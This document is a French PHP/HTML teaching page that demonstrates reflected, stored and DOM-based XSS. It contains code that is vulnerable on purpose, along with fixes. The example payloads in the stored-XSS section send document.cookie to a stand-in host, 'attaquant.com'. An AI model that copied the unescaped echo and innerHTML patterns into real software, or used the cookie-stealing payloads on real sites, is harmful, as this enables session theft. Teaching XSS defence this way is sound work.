<?php
// Initialisation et gestion des messages stockés
$messagesFile = 'messages.txt';
if (!file_exists($messagesFile)) {
    file_put_contents($messagesFile, '');
}

// Gestion du POST pour les messages stockés
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['stored_message'])) {
    $message = $_POST['stored_message'] . "\n";
    file_put_contents($messagesFile, $message, FILE_APPEND);
    header('Location: ' . $_SERVER['PHP_SELF'] . '#stored');
    exit();
}

// Lecture des messages stockés
$storedMessages = file_exists($messagesFile) ? 
    array_filter(explode("\n", file_get_contents($messagesFile))) : [];

// Paramètre XSS réfléchi
$reflectedXSS = isset($_GET['reflected_input']) ? $_GET['reflected_input'] : '';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>OWASP A03:2021 - Démonstration XSS</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 40px; 
            line-height: 1.6;
        }
        .tab {
            overflow: hidden;
            border: 1px solid #ccc;
            background-color: #f1f1f1;
        }
        .tab button {
            background-color: inherit;
            float: left;
            border: none;
            outline: none;
            cursor: pointer;
            padding: 14px 16px;
            transition: 0.3s;
        }
        .tab button:hover {
            background-color: #ddd;
        }
        .tab button.active {
            background-color: #ccc;
        }
        .tabcontent {
            display: none;
            padding: 20px;
            border: 1px solid #ccc;
            border-top: none;
        }
        .visible {
            display: block;
        }
        .demo-box {
            border: 1px solid #ddd;
            padding: 20px;
            margin: 20px 0;
            background-color: #f9f9f9;
        }
        .warning {
            background-color: #fff3cd;
            padding: 10px;
            border: 1px solid #ffeeba;
            margin: 10px 0;
        }
        code {
            background-color: #f8f9fa;
            padding: 2px 4px;
            border-radius: 4px;
        }
        pre {
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 4px;
            overflow-x: auto;
        }
        input[type="text"] {
            padding: 8px;
            margin: 5px 0;
            width: 300px;
        }
        button {
            padding: 8px 15px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>OWASP A03:2021 - Démonstration des Types de XSS</h1>
    
    <div class="warning">
        ⚠️ Cette application est intentionnellement vulnérable à des fins éducatives.
        Ne l'utilisez jamais en production.
    </div>

    <div class="tab">
        <button class="tablinks" onclick="openTab(event, 'reflected')" id="defaultOpen">XSS Réfléchi</button>
        <button class="tablinks" onclick="openTab(event, 'stored')">XSS Stocké</button>
        <button class="tablinks" onclick="openTab(event, 'dom')">XSS basé sur le DOM</button>
    </div>

    <!-- XSS Réfléchi -->
    <div id="reflected" class="tabcontent">
        <h2>1. XSS Réfléchi (Non-persistant)</h2>
        
        <div class="demo-box">
            <h3>Démonstration</h3>
            <form action="" method="GET">
                <input type="text" name="reflected_input" placeholder="Entrez votre texte...">
                <button type="submit">Envoyer</button>
            </form>
            
            <?php if (!empty($reflectedXSS)): ?>
                <div>
                    Vous avez écrit : <?php echo $reflectedXSS; ?>
                </div>
            <?php endif; ?>
        </div>

        <h3>Explication</h3>
        <p>Le XSS réfléchi se produit lorsque l'application renvoie immédiatement les données non validées au navigateur.</p>
        
        <h4>Exemples de Payload</h4>
        <pre>&lt;script&gt;alert('XSS')&lt;/script&gt;
&lt;img src="x" onerror="alert('XSS')"&gt;
&lt;svg onload="alert('XSS')"&gt;</pre>

        <h4>Code Vulnérable</h4>
        <pre>echo $_GET['reflected_input'];</pre>

        <h4>Code Sécurisé</h4>
        <pre>echo htmlspecialchars($_GET['reflected_input'], ENT_QUOTES, 'UTF-8');</pre>
    </div>

    <!-- XSS Stocké -->
    <div id="stored" class="tabcontent">
        <h2>2. XSS Stocké (Persistant)</h2>
        
        <div class="demo-box">
            <h3>Démonstration</h3>
            <form action="" method="POST">
                <input type="text" name="stored_message" placeholder="Laissez un message...">
                <button type="submit">Enregistrer</button>
            </form>

            <h4>Messages enregistrés :</h4>
            <?php foreach ($storedMessages as $message): ?>
                <div><?php echo $message; ?></div>
            <?php endforeach; ?>
        </div>

        <h3>Explication</h3>
        <p>Le XSS stocké est plus dangereux car le code malveillant est sauvegardé dans la base de données 
        et affiché à tous les visiteurs.</p>

        <h4>Exemples de Payload</h4>
        <pre>&lt;script&gt;
    fetch('https://attaquant.com/vol-cookies?c=' + document.cookie)
&lt;/script&gt;

&lt;img src="x" onerror="
    let vol = document.cookie;
    new Image().src='https://attaquant.com/cookies?'+vol;
"&gt;</pre>

        <h4>Impact</h4>
        <ul>
            <li>Vol de session</li>
            <li>Modification du contenu de la page</li>
            <li>Redirection des utilisateurs</li>
            <li>Keylogging</li>
        </ul>
    </div>

    <!-- XSS basé sur le DOM -->
    <div id="dom" class="tabcontent">
        <h2>3. XSS basé sur le DOM</h2>
        
        <div class="demo-box">
            <h3>Démonstration</h3>
            <input type="text" id="dom_input" placeholder="Entrez du texte...">
            <button onclick="updateDOM()">Mettre à jour</button>
            <div id="dom_output"></div>
        </div>

        <script>
            function updateDOM() {
                var userInput = document.getElementById('dom_input').value;
                document.getElementById('dom_output').innerHTML = 
                    "Vous avez écrit : " + userInput;
            }
        </script>

        <h3>Explication</h3>
        <p>Le XSS basé sur le DOM se produit lorsque JavaScript modifie le DOM avec des données non validées.</p>

        <h4>Exemples de Payload</h4>
        <pre>&lt;img src="x" onerror="alert('XSS')"&gt;
&lt;svg onload="alert('XSS')"&gt;
&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>

        <h4>Code Vulnérable</h4>
        <pre>element.innerHTML = userInput;</pre>

        <h4>Code Sécurisé</h4>
        <pre>element.textContent = userInput;
// ou
import { escape } from 'html-escaper';
element.innerHTML = escape(userInput);</pre>
    </div>

    <script>
        function openTab(evt, tabName) {
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }

        document.getElementById("defaultOpen").click();
    </script>

    <!-- Documentation détaillée -->
    <div class="documentation" style="margin-top: 40px">
        <h2>Documentation Complète</h2>

        <h3>Les Différents Types de XSS</h3>
        
        <h4>1. XSS Réfléchi (Non-persistant)</h4>
        <ul>
            <li>Le code malveillant est inclus dans la requête HTTP</li>
            <li>L'application renvoie immédiatement ce code dans la réponse</li>
            <li>Souvent exploité via des liens malveillants</li>
            <li>Nécessite que la victime clique sur un lien spécialement conçu</li>
        </ul>

        <h4>2. XSS Stocké (Persistant)</h4>
        <ul>
            <li>Le code malveillant est sauvegardé dans la base de données</li>
            <li>Affecte tous les visiteurs de la page</li>
            <li>Plus dangereux car ne nécessite pas d'action de la victime</li>
            <li>Souvent trouvé dans les commentaires, profils, messages</li>
        </ul>

        <h4>3. XSS basé sur le DOM</h4>
        <ul>
            <li>Le code malveillant est exécuté par JavaScript côté client</li>
            <li>Modification du DOM avec des données non sécurisées</li>
            <li>Peut être exploité même si le serveur valide correctement les données</li>
            <li>Souvent lié à l'utilisation de innerHTML</li>
        </ul>

        <h3>Impact des Attaques XSS</h3>
        <ul>
            <li>Vol de cookies de session</li>
            <li>Vol de données sensibles</li>
            <li>Capture de frappes clavier</li>
            <li>Modification du contenu de la page</li>
            <li>Redirection des utilisateurs</li>
            <li>Exécution de code arbitraire dans le contexte de la victime</li>
        </ul>

        <h3>Comment se Protéger</h3>
        
        <h4>1. Validation des Entrées</h4>
        <pre>
// PHP
$input = filter_input(INPUT_GET, 'user_input', FILTER_SANITIZE_STRING);

// JavaScript
const input = DOMPurify.sanitize(userInput);</pre>

        <h4>2. Échappement des Sorties</h4>
        <pre>
// PHP
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

// JavaScript
element.textContent = userInput; // Au lieu de innerHTML</pre>

        <h4>3. En-têtes de Sécurité</h4>
        <pre>
// PHP
header("Content-Security-Policy: default-src 'self'");
header("X-XSS-Protection: 1; mode=block");</pre>

        <h4>4. Cookies Sécurisés</h4>
        <pre>
// PHP
setcookie("session", $value, [
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);</pre>

        <h3>Outils de Test</h3>
        <ul>
            <li>OWASP ZAP</li>
            <li>Burp Suite</li>
            <li>XSS Hunter</li>
        </ul>

        <h3>Ressources Additionnelles</h3>
        <ul>
            <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP XSS</a></li>
            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
            <li><a href="https://www.google.com/about/appsecurity/learning/xss/">Google XSS Game</a></li>
        </ul>
    </div>
</body>
</html>
